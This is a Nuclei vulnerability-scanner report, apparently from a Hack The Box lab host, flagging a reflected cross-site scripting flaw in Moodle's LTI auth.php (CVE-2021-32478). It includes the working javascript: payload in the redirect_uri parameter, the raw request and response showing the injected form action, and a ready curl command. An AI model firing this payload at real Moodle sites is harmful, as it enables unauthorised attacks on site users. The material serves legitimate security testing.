### Moodle - Cross-Site Scripting (moodle-xss) found on moodle.schooled.htb

----
**Details**: **moodle-xss** matched at moodle.schooled.htb

**Protocol**: HTTP

**Full URL**: http://moodle.schooled.htb/moodle/mod/lti/auth.php?redirect_uri=javascript:alert('2fjgb7NMz5IMWAcozlpOCwyPKT0')

**Timestamp**: Sun Apr 28 17:03:54 +0100 BST 2024

**Template Information**

| Key | Value |
| --- | --- |
| Name | Moodle - Cross-Site Scripting |
| Authors | hackergautam |
| Tags | moodle, xss, intrusive |
| Severity | medium |
| Description | Moodle 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8, and earlier unsupported versions contain a cross-site scripting vulnerability via the redirect_uri parameter. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| CWE-ID | [CWE-80](https://cwe.mitre.org/data/definitions/80.html) |
| CVSS-Score | 5.40 |

**Request**
```http
GET /moodle/mod/lti/auth.php?redirect_uri=javascript:alert('2fjgb7NMz5IMWAcozlpOCwyPKT0') HTTP/1.1
Host: moodle.schooled.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Content-Length: 366
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: text/html; charset=utf-8
Date: Sun, 28 Apr 2024 16:03:53 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.46 (FreeBSD) PHP/7.4.15
Set-Cookie: MoodleSession=h9m58o4u3dt1e7dvvmj8r392hk; path=/moodle/
X-Powered-By: PHP/7.4.15

<form action="javascript:alert('2fjgb7NMz5IMWAcozlpOCwyPKT0')" name="ltiAuthForm" id="ltiAuthForm" method="post" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="error" value="invalid_request"/>
  <input type="hidden" name="state" value=""/>
</form>
<script type="text/javascript">
//<![CDATA[
document.ltiAuthForm.submit();
//]]>
</script>

```

References: 
- https://twitter.com/jacksonhhax/status/1391367064154042377
- https://nvd.nist.gov/vuln/detail/cve-2021-32478

**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0' 'http://moodle.schooled.htb/moodle/mod/lti/auth.php?redirect_uri=javascript:alert('\''2fjgb7NMz5IMWAcozlpOCwyPKT0'\'')'
```

----

Generated by [Nuclei v3.2.2](https://github.com/projectdiscovery/nuclei)